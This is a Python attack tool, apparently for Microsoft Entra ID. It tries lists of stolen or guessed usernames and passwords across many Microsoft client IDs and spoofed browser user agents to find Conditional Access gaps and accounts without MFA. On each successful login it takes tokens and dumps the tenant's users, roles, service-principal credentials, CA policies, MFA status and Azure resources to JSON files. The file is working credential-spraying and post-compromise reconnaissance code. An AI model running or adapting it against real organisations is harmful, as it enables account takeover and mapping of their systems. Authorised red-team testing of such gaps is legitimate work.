#!/usr/bin/env python3
"""
entra_jumper.py — probe Entra CA gaps, enumerate everything on success

1. Probes cred list across client IDs / UAs for CA gaps
2. On any success, acquires Graph + Azure tokens and enumerates the tenant
3. Deduplicates across all successful accounts
4. Writes per-category JSON files + summary

Usage:
    python entra_jumper.py -f creds.txt -t cummins-wagner.com
    python entra_jumper.py -f creds.txt -t cummins-wagner.com --clients legacy --out ./results
"""

import argparse
import json
import os
import re
import sys
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Optional

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("pip install requests")

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TaskProgressColumn, TextColumn, TimeElapsedColumn
    from rich import box
    RICH = True
    con = Console(highlight=False)
except ImportError:
    RICH = False
    con = None

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

GRAPH      = "https://graph.microsoft.com/v1.0"
GRAPH_BETA = "https://graph.microsoft.com/beta"
ARM        = "https://management.azure.com"
ARM_API    = "2021-04-01"

TOKEN_V2 = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
TOKEN_V1 = "https://login.microsoftonline.com/{tenant}/oauth2/token"

CLIENT_PROFILES = {
    "az_powershell":  ("Azure PowerShell",    "1b730954-1685-4b74-9bfd-dac224a7b894", "https://graph.microsoft.com/.default"),
    "az_cli":         ("Azure CLI",           "04b07795-8ddb-461a-bbee-02f9e1bf7b46", "https://management.azure.com/.default"),
    "office":         ("Microsoft Office",    "d3590ed6-52b3-4102-aeff-aad2292ab01c", "https://graph.microsoft.com/.default"),
    "teams":          ("Microsoft Teams",     "1fec8e78-bce4-4aaf-ab1b-5451cc387264", "https://graph.microsoft.com/.default"),
    "ews_legacy":     ("EWS / Outlook",       "d3590ed6-52b3-4102-aeff-aad2292ab01c", "https://outlook.office365.com/.default"),
    "activesync":     ("Exchange ActiveSync", "ecd6b820-32c2-49b6-98a6-444530e5a77a", "https://outlook.office365.com/.default"),
    "outlook_mobile": ("Outlook Mobile",      "27922004-5251-4030-b22d-91ecd9a37ea4", "https://outlook.office.com/.default"),
    "onedrive":       ("OneDrive",            "ab9b8c07-8f02-4f72-87fa-80105867a763", "https://graph.microsoft.com/.default"),
    "broker":         ("Auth Broker",         "29d9ed98-a469-4536-ade2-f981bc1d605e", "https://graph.microsoft.com/.default"),
    "o365_mgmt":      ("O365 Management",     "00b41c95-dab0-4487-9791-b9d2c32c80f2", "https://manage.office.com/.default"),
    "intune":         ("Intune Enrollment",   "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223", "https://graph.microsoft.com/.default"),
}

PRESET_GROUPS = {
    "all":    list(CLIENT_PROFILES.keys()),
    "legacy": ["ews_legacy", "activesync", "outlook_mobile"],
    "graph":  ["az_powershell", "office", "teams"],
    "mgmt":   ["az_powershell", "az_cli", "o365_mgmt"],
}

V1_CLIENTS = {"ews_legacy", "activesync", "outlook_mobile"}

USER_AGENTS = {
    "chrome_win":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "firefox_win":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "edge_win":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "safari_mac":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "safari_iphone":  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "chrome_android": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "ie11":           "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "curl":           "curl/8.7.1",
}

MFA_CODES           = {"AADSTS50076", "AADSTS50158", "AADSTS50074"}
MFA_NOT_ENROLLED    = {"AADSTS50079", "AADSTS50072"}
CA_BLOCK_CODES      = {"AADSTS53003", "AADSTS53000", "AADSTS53001", "AADSTS50131"}
BAD_CRED_CODES      = {"AADSTS50126", "AADSTS50128"}
DISABLED_CODES      = {"AADSTS50057", "AADSTS50144"}
NOTFOUND_CODES      = {"AADSTS50034", "AADSTS50059"}
SKIP_CODES          = {"AADSTS900144", "AADSTS700016", "AADSTS90014"}
SYSTEM_PREFIXES     = ("SM_", "DiscoverySearchMailbox", "FederatedEmail", "SystemMailbox")

COUNT_KEY_TO_FILE = {
    "users":              "graph_users.json",
    "groups":             "graph_groups.json",
    "devices":            "graph_devices.json",
    "service_principals": "graph_service_principals.json",
    "applications":       "graph_applications.json",
    "roles":              "graph_roles.json",
    "cap_policies":       "graph_cap_policies.json",
    "named_locations":    "graph_named_locations.json",
    "mfa_details":        "graph_mfa_details.json",
    "subscriptions":      "azure_subscriptions.json",
    "resources":          "azure_resources.json",
    "role_assignments":   "azure_role_assignments.json",
}

# Service plan name substrings -> friendly label
SERVICE_PLAN_MAP = {
    "exchange":          "Outlook/Exchange",
    "outlook":           "Outlook/Exchange",
    "sharepoint":        "SharePoint",
    "onedrive":          "OneDrive",
    "teams":             "Teams",
    "mcostandard":       "Teams",    # Skype/Teams legacy plan name
    "mco":               "Teams",
    "sharepointwac":     "OneDrive", # Office for the web = OneDrive access
}


def detect_services(graph_token: str) -> dict[str, bool]:
    """Check /me/licenseDetails for key service plans."""
    s = graph_session(graph_token)
    services = {"Outlook/Exchange": False, "SharePoint": False,
                "OneDrive": False, "Teams": False}
    try:
        r = s.get(f"{GRAPH}/me/licenseDetails", timeout=10)
        if not r.ok:
            return services
        for lic in r.json().get("value", []):
            for plan in lic.get("servicePlans", []):
                if plan.get("provisioningStatus") != "Success":
                    continue
                name = plan.get("servicePlanName", "").lower()
                for keyword, label in SERVICE_PLAN_MAP.items():
                    if keyword in name:
                        services[label] = True
    except Exception:
        pass
    return services

STATUS_STYLE = {
    "SUCCESS":          ("bold green",  "  + SUCCESS      "),
    "MFA_NOT_ENROLLED": ("bold yellow", "  ! NOT ENROLLED "),
    "MFA_REQUIRED":     ("cyan",        "  ~ MFA REQUIRED "),
    "CA_BLOCKED":       ("dim",         "  x CA BLOCKED   "),
    "UNKNOWN":          ("magenta",     "  ? UNKNOWN      "),
}

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class ProbeResult:
    username: str
    client_key: str
    client_label: str
    resource: str
    user_agent_key: str
    status: str
    error_code: str  = ""
    error_desc: str  = ""
    access_token: str = ""
    token_type: str  = ""
    scope: str       = ""


class TenantData:
    """Accumulates enumerated objects across multiple successful accounts."""
    def __init__(self):
        self.users:              dict = {}
        self.groups:             dict = {}
        self.devices:            dict = {}
        self.service_principals: dict = {}
        self.applications:       dict = {}
        self.roles:              dict = {}
        self.cap_policies:       dict = {}
        self.named_locations:    dict = {}
        self.mfa_details:        dict = {}
        self.org_info:           dict = {}
        self.auth_policy:        dict = {}
        self.subscriptions:      dict = {}
        self.resources:          dict = {}
        self.role_assignments:   dict = {}

    def add_many(self, store: dict, items: list, key: str = "id"):
        added = 0
        for item in items:
            k = item.get(key) or item.get("id")
            if k and k not in store:
                store[k] = item
                added += 1
        return added

    def counts(self) -> dict:
        return {
            "users":              len(self.users),
            "groups":             len(self.groups),
            "devices":            len(self.devices),
            "service_principals": len(self.service_principals),
            "applications":       len(self.applications),
            "roles":              len(self.roles),
            "cap_policies":       len(self.cap_policies),
            "named_locations":    len(self.named_locations),
            "mfa_details":        len(self.mfa_details),
            "subscriptions":      len(self.subscriptions),
            "resources":          len(self.resources),
            "role_assignments":   len(self.role_assignments),
        }


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def make_session() -> requests.Session:
    s = requests.Session()
    retry = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    s.mount("https://", HTTPAdapter(max_retries=retry))
    return s


def paginate(session: requests.Session, url: str) -> list:
    results = []
    while url:
        r = session.get(url, timeout=20)
        if r.status_code in (401, 403):
            return []
        if not r.ok:
            break
        data = r.json()
        results.extend(data.get("value", []))
        url = data.get("@odata.nextLink") or data.get("nextLink")
    return results


def get_one(session: requests.Session, url: str) -> dict:
    try:
        r = session.get(url, timeout=20)
        if r.ok:
            return r.json()
    except Exception:
        pass
    return {}


def graph_session(token: str) -> requests.Session:
    s = make_session()
    s.headers.update({
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "ConsistencyLevel": "eventual",
    })
    return s


def arm_session(token: str) -> requests.Session:
    s = make_session()
    s.headers.update({
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
    })
    return s


# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------

def extract_error_code(text: str) -> str:
    m = re.search(r"(AADSTS\d+)", text)
    return m.group(1) if m else ""


def classify_error(code: str) -> str:
    if code in MFA_NOT_ENROLLED:  return "MFA_NOT_ENROLLED"
    if code in MFA_CODES:         return "MFA_REQUIRED"
    if code in CA_BLOCK_CODES:    return "CA_BLOCKED"
    if code in BAD_CRED_CODES:    return "BAD_CREDS"
    if code in DISABLED_CODES:    return "DISABLED"
    if code in NOTFOUND_CODES:    return "NOT_FOUND"
    if code in SKIP_CODES:        return "SKIP"
    return "UNKNOWN"


def ropc(session: requests.Session, tenant: str, username: str,
         password: str, client_id: str, scope: str,
         ua: str, v1: bool = False) -> dict:
    url = TOKEN_V1.format(tenant=tenant) if v1 else TOKEN_V2.format(tenant=tenant)
    if v1:
        data = {"grant_type": "password", "client_id": client_id,
                "username": username, "password": password,
                "resource": scope.replace("/.default", "/")}
    else:
        data = {"grant_type": "password", "client_id": client_id,
                "username": username, "password": password, "scope": scope}
    r = session.post(url, data=data,
                     headers={"Content-Type": "application/x-www-form-urlencoded",
                               "User-Agent": USER_AGENTS[ua]},
                     timeout=15)
    return r.json()


def get_token_for_scope(tenant: str, username: str, password: str,
                        scope: str, client_id: str) -> Optional[str]:
    """Best-effort token acquisition for a specific scope after a known-good cred."""
    s = make_session()
    try:
        body = ropc(s, tenant, username, password, client_id, scope, "chrome_win")
        return body.get("access_token")
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Probe phase
# ---------------------------------------------------------------------------

def probe_one(session: requests.Session, tenant: str, username: str,
              password: str, client_key: str, ua_key: str) -> ProbeResult:
    label, client_id, resource = CLIENT_PROFILES[client_key]
    v1 = client_key in V1_CLIENTS
    result = ProbeResult(username=username, client_key=client_key,
                         client_label=label, resource=resource,
                         user_agent_key=ua_key, status="UNKNOWN")
    try:
        body = ropc(session, tenant, username, password, client_id, resource, ua_key, v1)
    except Exception as e:
        result.error_desc = str(e)
        return result

    if "access_token" in body:
        result.status       = "SUCCESS"
        result.access_token = body.get("access_token", "")
        result.scope        = body.get("scope", "")
        return result

    codes = body.get("error_codes", [])
    code  = f"AADSTS{codes[0]}" if codes else extract_error_code(body.get("error_description", ""))
    result.error_code = code
    result.error_desc = (body.get("error_description") or "")[:120]
    result.status     = classify_error(code)
    return result


# ---------------------------------------------------------------------------
# Graph enumeration
# ---------------------------------------------------------------------------

USER_SELECT = "id,displayName,userPrincipalName,accountEnabled,jobTitle,department,mail,onPremisesSamAccountName,lastPasswordChangeDateTime,assignedLicenses,userType"
SP_SELECT   = "id,displayName,appId,servicePrincipalType,keyCredentials,passwordCredentials,appRoles,publisherName"
DEV_SELECT  = "id,displayName,operatingSystem,operatingSystemVersion,trustType,isCompliant,isManaged,approximateLastSignInDateTime,deviceId"


def enumerate_graph(token: str, data: TenantData) -> dict:
    s = graph_session(token)
    added = defaultdict(int)

    # Org
    org = get_one(s, f"{GRAPH}/organization")
    if org.get("value"):
        data.org_info = org["value"][0]

    # Users
    items = paginate(s, f"{GRAPH}/users?$select={USER_SELECT}&$top=999")
    added["users"] = data.add_many(data.users, items)

    # Groups (with member count)
    items = paginate(s, f"{GRAPH}/groups?$select=id,displayName,groupTypes,membershipRule,mail,securityEnabled&$top=999")
    added["groups"] = data.add_many(data.groups, items)

    # Devices
    items = paginate(s, f"{GRAPH}/devices?$select={DEV_SELECT}&$top=999")
    added["devices"] = data.add_many(data.devices, items)

    # Service Principals
    items = paginate(s, f"{GRAPH}/servicePrincipals?$select={SP_SELECT}&$top=999")
    added["service_principals"] = data.add_many(data.service_principals, items)

    # App Registrations
    items = paginate(s, f"{GRAPH}/applications?$select=id,displayName,appId,createdDateTime,keyCredentials,passwordCredentials,requiredResourceAccess&$top=999")
    added["applications"] = data.add_many(data.applications, items)

    # Directory Roles + members
    roles = paginate(s, f"{GRAPH}/directoryRoles")
    for role in roles:
        rid = role.get("id")
        if not rid or rid in data.roles:
            continue
        members = paginate(s, f"{GRAPH}/directoryRoles/{rid}/members?$select=id,displayName,userPrincipalName")
        role["_members"] = members
        data.roles[rid] = role
        added["roles"] += 1

    # CA Policies
    items = paginate(s, f"{GRAPH}/identity/conditionalAccess/policies")
    added["cap_policies"] = data.add_many(data.cap_policies, items)

    # Named Locations
    items = paginate(s, f"{GRAPH}/identity/conditionalAccess/namedLocations")
    added["named_locations"] = data.add_many(data.named_locations, items)

    # MFA registration (beta)
    items = paginate(s, f"{GRAPH_BETA}/reports/credentialUserRegistrationDetails")
    added["mfa_details"] = data.add_many(data.mfa_details, items, key="userPrincipalName")

    # Auth policy
    policy = get_one(s, f"{GRAPH}/policies/authorizationPolicy")
    if policy and not data.auth_policy:
        data.auth_policy = policy

    return dict(added)


# ---------------------------------------------------------------------------
# Azure enumeration
# ---------------------------------------------------------------------------

OWNED_TYPE_LABELS = {
    "application":      "app",
    "serviceprincipal": "SP",
    "group":            "group",
    "device":           "device",
}


def enumerate_owned_objects(graph_token: str) -> dict[str, list]:
    """Return all objects owned by the authed user, keyed by friendly type."""
    s = graph_session(graph_token)
    owned: dict[str, list] = {}
    try:
        items = paginate(s, f"{GRAPH}/me/ownedObjects?$select=id,displayName,appId&$top=999")
        for item in items:
            raw = item.get("@odata.type", "").lower().replace("#microsoft.graph.", "")
            label = OWNED_TYPE_LABELS.get(raw, raw) if raw else "unknown"
            owned.setdefault(label, []).append(item)
    except Exception:
        pass
    return owned


def enumerate_user_roles(graph_token: str) -> list[str]:
    """Return displayNames of all Entra directory roles the authed user holds."""
    s = graph_session(graph_token)
    roles = []
    try:
        items = paginate(
            s,
            f"{GRAPH}/me/transitiveMemberOf/microsoft.graph.directoryRole"
            "?$select=id,displayName&$top=999",
        )
        roles = [r.get("displayName", r.get("id", "")) for r in items if r.get("displayName")]
    except Exception:
        pass
    return sorted(roles)


def enumerate_azure(token: str, data: TenantData) -> tuple[dict, dict]:
    """Returns (added, found) — found is total visible to this token before dedup."""
    s = arm_session(token)
    added = defaultdict(int)
    found = defaultdict(int)

    subs = paginate(s, f"{ARM}/subscriptions?api-version={ARM_API}")
    found["subscriptions"] = len(subs)
    added["subscriptions"] = data.add_many(data.subscriptions, subs, key="subscriptionId")

    for sub in subs:
        sid = sub.get("subscriptionId")
        if not sid:
            continue

        # All resources in subscription
        resources = paginate(s, f"{ARM}/subscriptions/{sid}/resources?api-version={ARM_API}")
        found["resources"] += len(resources)
        added["resources"] += data.add_many(data.resources, resources)

        # Role assignments (RBAC)
        assignments = paginate(s, f"{ARM}/subscriptions/{sid}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()")
        found["role_assignments"] += len(assignments)
        added["role_assignments"] += data.add_many(data.role_assignments, assignments)

    return dict(added), dict(found)


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def rprint(msg: str):
    if RICH:
        con.print(msg)
    else:
        print(re.sub(r'\[/?[^\]]*\]', '', msg))


def write_outputs(data: TenantData, out_dir: Path) -> list[str]:
    out_dir.mkdir(parents=True, exist_ok=True)
    files = []

    def write(name: str, obj):
        if not obj:
            return
        p = out_dir / name
        with open(p, "w") as f:
            json.dump(obj if isinstance(obj, list) else list(obj.values()), f, indent=2, default=str)
        files.append(str(p))

    write("graph_users.json",              data.users)
    write("graph_groups.json",             data.groups)
    write("graph_devices.json",            data.devices)
    write("graph_service_principals.json", data.service_principals)
    write("graph_applications.json",       data.applications)
    write("graph_roles.json",              data.roles)
    write("graph_cap_policies.json",       data.cap_policies)
    write("graph_named_locations.json",    data.named_locations)
    write("graph_mfa_details.json",        data.mfa_details)
    write("azure_subscriptions.json",      data.subscriptions)
    write("azure_resources.json",          data.resources)
    write("azure_role_assignments.json",   data.role_assignments)

    if data.org_info:
        with open(out_dir / "graph_org.json", "w") as f:
            json.dump(data.org_info, f, indent=2, default=str)
        files.append(str(out_dir / "graph_org.json"))

    return files


def print_summary(successes: dict, unenrolled: set, mfa_required: set,
                  data: TenantData, files: list[str]):
    counts = data.counts()
    rprint("")

    if RICH:
        # Successful users table
        if successes:
            SVC_KEYS = ["Outlook/Exchange", "SharePoint", "OneDrive", "Teams"]
            rprint(f"\n[bold]Successful Logins ({len(successes)})[/bold]")
            t = Table(box=box.MINIMAL, header_style="bold", show_edge=False)
            t.add_column("User",     no_wrap=True)
            t.add_column("Graph",    justify="center")
            t.add_column("Azure",    justify="right")
            t.add_column("Owns")
            t.add_column("Roles")
            t.add_column("Licenses")
            for user, info in sorted(successes.items()):
                services = info.get("services", {})
                licensed = "  ".join(k for k, v in services.items() if v) or "—"

                arm_counts = info.get("azure_resource_count", {})
                arm_str = f"{arm_counts.get('resources', 0)} res ({arm_counts.get('subscriptions', 0)} subs)" if arm_counts else "—"

                owned = info.get("owned_objects", {})
                owns_str = ", ".join(f"{len(v)} {k}" for k, v in sorted(owned.items()) if v) or "—"

                roles = info.get("entra_roles", [])
                roles_str = ", ".join(roles) if roles else "—"

                t.add_row(
                    user,
                    "Y" if info.get("graph") else "n",
                    arm_str if info.get("azure") else "n",
                    owns_str,
                    roles_str,
                    licensed,
                )
            con.print(t)

        # MFA not enrolled
        if unenrolled:
            rprint(f"\n[bold]MFA Not Enrolled ({len(unenrolled)})[/bold]")
            for u in sorted(unenrolled):
                rprint(f"  {u}")


        # Enumeration counts
        graph_counts = {k: v for k, v in counts.items()
                        if k not in ("subscriptions", "resources", "role_assignments") and v}
        azure_counts = {k: v for k, v in counts.items()
                        if k in ("subscriptions", "resources", "role_assignments") and v}

        if graph_counts or azure_counts:
            file_names = {Path(f).name: f for f in files}
            rprint("\n[bold]Enumeration[/bold]")
            if graph_counts:
                rprint("  Graph / Entra")
                for k, v in graph_counts.items():
                    fname = file_names.get(COUNT_KEY_TO_FILE.get(k, ""), "")
                    fsuffix = f"  [dim]{fname}[/dim]" if fname else ""
                    rprint(f"    {k.replace('_', ' ').title():<24} {v}{fsuffix}")
                if "graph_org.json" in file_names:
                    rprint(f"    {'Org':<24}   [dim]{file_names['graph_org.json']}[/dim]")
            if azure_counts:
                rprint("  Azure ARM")
                for k, v in azure_counts.items():
                    fname = file_names.get(COUNT_KEY_TO_FILE.get(k, ""), "")
                    fsuffix = f"  [dim]{fname}[/dim]" if fname else ""
                    rprint(f"    {k.replace('_', ' ').title():<24} {v}{fsuffix}")

    else:
        print("\n=== RESULTS ===")
        for u, info in sorted(successes.items()):
            owned = info.get("owned_objects", {})
            arm   = info.get("azure_resource_count", {})
            roles = info.get("entra_roles", [])
            own_str  = ("  owns=" + ",".join(f"{len(v)}{k}" for k,v in sorted(owned.items()) if v)) if owned else ""
            arm_str  = f"  azure_res={arm.get('resources',0)}({arm.get('subscriptions',0)} subs)" if arm else ""
            role_str = f"  roles={';'.join(roles)}" if roles else ""
            print(f"  SUCCESS: {u}{own_str}{arm_str}{role_str}")
        for u in sorted(unenrolled):
            print(f"  MFA NOT ENROLLED: {u}")
        for k, v in counts.items():
            if v:
                print(f"  {k}: {v}")
        for f in files:
            print(f"  FILE: {f}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def load_creds(path: str, default_domain: str) -> list[tuple[str, str]]:
    creds = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or ":" not in line:
                continue
            user, _, pw = line.partition(":")
            user = user.strip()
            pw   = pw.strip()
            if "@" not in user:
                user = f"{user}@{default_domain}"
            local = user.split("@")[0]
            if any(local.startswith(p) for p in SYSTEM_PREFIXES):
                continue
            creds.append((user, pw))
    return creds


def main():
    p = argparse.ArgumentParser(description="Probe Entra CA gaps and enumerate on success")
    p.add_argument("-f", "--creds",   required=True, help="Credentials file (user:pass per line)")
    p.add_argument("-t", "--tenant",  required=True, help="Tenant domain")
    p.add_argument("--clients",       default="all", choices=list(PRESET_GROUPS.keys()))
    p.add_argument("--ua",            default="chrome_win",
                   choices=list(USER_AGENTS.keys()) + ["all"])
    p.add_argument("--workers",       type=int,   default=5)
    p.add_argument("--delay",         type=float, default=0.5)
    p.add_argument("--out",           default="", help="Output directory (default: entra-jump-<ts>)")
    p.add_argument("--no-enumerate",  action="store_true", help="Skip enumeration, probe only")
    args = p.parse_args()

    client_keys = PRESET_GROUPS[args.clients]
    ua_keys     = list(USER_AGENTS.keys()) if args.ua == "all" else [args.ua]
    creds       = load_creds(args.creds, args.tenant)
    out_dir     = Path(args.out or f"entra-jump-{datetime.now().strftime('%Y%m%d-%H%M%S')}")

    rprint("[bold]entra_jumper[/bold]")
    rprint(f"  Tenant:   {args.tenant}")
    rprint(f"  Creds:    {len(creds)}")
    rprint(f"  Clients:  {args.clients} ({len(client_keys)})")
    rprint(f"  UA:       {args.ua}")
    rprint(f"  Workers:  {args.workers}  Delay: {args.delay}s")

    work = [(u, pw, ck, ua)
            for (u, pw) in creds
            for ck in client_keys
            for ua in ua_keys]

    rprint(f"\n[bold]Total probes:[/bold] {len(work)}\n")

    # Track state
    all_results:    list[ProbeResult] = []
    successes:      dict[str, dict]   = {}  # user -> {clients, graph, azure, tokens}
    mfa_users:      set[str]          = set()
    unenrolled:     set[str]          = set()
    enumerated:     set[str]          = set()
    tenant_data     = TenantData()
    probe_session   = make_session()

    def run_probe(t):
        u, pw, ck, ua = t
        time.sleep(args.delay)
        return probe_one(probe_session, args.tenant, u, pw, ck, ua)

    def do_enumerate(username: str, password: str):
        if username in enumerated or args.no_enumerate:
            return
        enumerated.add(username)
        rprint(f"  [bold cyan][*] Searching [{username}]...[/bold cyan]")

        # Graph token
        graph_tok = get_token_for_scope(
            args.tenant, username, password,
            "https://graph.microsoft.com/.default",
            "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure PowerShell
        )
        if graph_tok:
            services = detect_services(graph_tok)
            successes[username]["services"] = services
            svc_str = "  ".join(k for k, v in services.items() if v) or "none"
            rprint(f"  Licenses:  {svc_str}")
            added = enumerate_graph(graph_tok, tenant_data)
            successes[username]["graph"] = True
            total = sum(added.values())
            rprint(f"  Graph: +{total} objects  ({', '.join(f'{v} {k}' for k,v in added.items() if v)})")

            owned = enumerate_owned_objects(graph_tok)
            successes[username]["owned_objects"] = owned
            if owned:
                parts = [f"{len(v)} {k}" for k, v in sorted(owned.items()) if v]
                rprint(f"  Owns:      {', '.join(parts)}")

            roles = enumerate_user_roles(graph_tok)
            successes[username]["entra_roles"] = roles
            if roles:
                rprint(f"  Roles:     {', '.join(roles)}")

        # Azure token
        azure_tok = get_token_for_scope(
            args.tenant, username, password,
            "https://management.azure.com/.default",
            "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
        )
        if azure_tok:
            added, found = enumerate_azure(azure_tok, tenant_data)
            successes[username]["azure"] = True
            successes[username]["azure_resource_count"] = found
            rprint(f"  Azure: {found.get('subscriptions', 0)} subs  {found.get('resources', 0)} resources")
        rprint("")

    progress_cols = [
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=30),
        TaskProgressColumn(),
        TextColumn("[bright_black]{task.completed}/{task.total}"),
        TimeElapsedColumn(),
    ] if RICH else None

    def run_all():
        ctx = Progress(*progress_cols, console=con) if RICH else None
        task = ctx.add_task("[cyan]Probing...", total=len(work)) if RICH else None

        # Map future -> (username, password) for post-success enumeration
        future_creds = {}

        with ThreadPoolExecutor(max_workers=args.workers) as pool:
            futures = {}
            for w in work:
                f = pool.submit(run_probe, w)
                futures[f] = w
                future_creds[f] = (w[0], w[1])  # username, password

            def process(future):
                result = future.result()
                all_results.append(result)
                u  = result.username
                ck = result.client_key
                ua = result.user_agent_key

                if result.status == "SUCCESS":
                    if u not in successes:
                        successes[u] = {"graph": False, "azure": False, "password": future_creds[future][1]}
                        style, label = STATUS_STYLE["SUCCESS"]
                        rprint(f"[{style}]{label}[/{style}] [white]{u:<42}[/white] [bright_black]CLIENT: {ck:<16}[/bright_black] [dim]UA: {ua}[/dim]")
                        pw = future_creds[future][1]
                        do_enumerate(u, pw)

                elif result.status == "MFA_NOT_ENROLLED":
                    if u not in mfa_users:
                        mfa_users.add(u)
                        unenrolled.add(u)
                        style, label = STATUS_STYLE["MFA_NOT_ENROLLED"]
                        rprint(f"[{style}]{label}[/{style}] [white]{u:<42}[/white] [bright_black]{ck:<16}[/bright_black] [dim]{ua}[/dim]")

                elif result.status == "MFA_REQUIRED":
                    if u not in mfa_users:
                        mfa_users.add(u)
                        style, label = STATUS_STYLE["MFA_REQUIRED"]
                        rprint(f"[{style}]{label}[/{style}] [white]{u:<42}[/white] [bright_black]{ck:<16}[/bright_black] [dim]{ua}[/dim]")

                elif result.status == "CA_BLOCKED":
                    style, label = STATUS_STYLE["CA_BLOCKED"]
                    rprint(f"[{style}]{label}[/{style}] [white]{u:<42}[/white] [bright_black]{ck:<16}[/bright_black] [dim]{ua}  {result.error_code}[/dim]")

                elif result.status == "UNKNOWN":
                    style, label = STATUS_STYLE["UNKNOWN"]
                    rprint(f"[{style}]{label}[/{style}] [white]{u:<42}[/white] [bright_black]{ck:<16}[/bright_black] [dim]{result.error_code}: {result.error_desc[:40]}[/dim]")

                if RICH:
                    ctx.advance(task)
                elif len(all_results) % 50 == 0:
                    print(f"  ... {len(all_results)}/{len(work)} probes done")

            if RICH:
                with ctx:
                    for future in as_completed(futures):
                        process(future)
            else:
                for future in as_completed(futures):
                    process(future)

    run_all()

    # Write outputs
    files = write_outputs(tenant_data, out_dir) if not args.no_enumerate else []

    print_summary(successes, unenrolled, mfa_users, tenant_data, files)


if __name__ == "__main__":
    main()
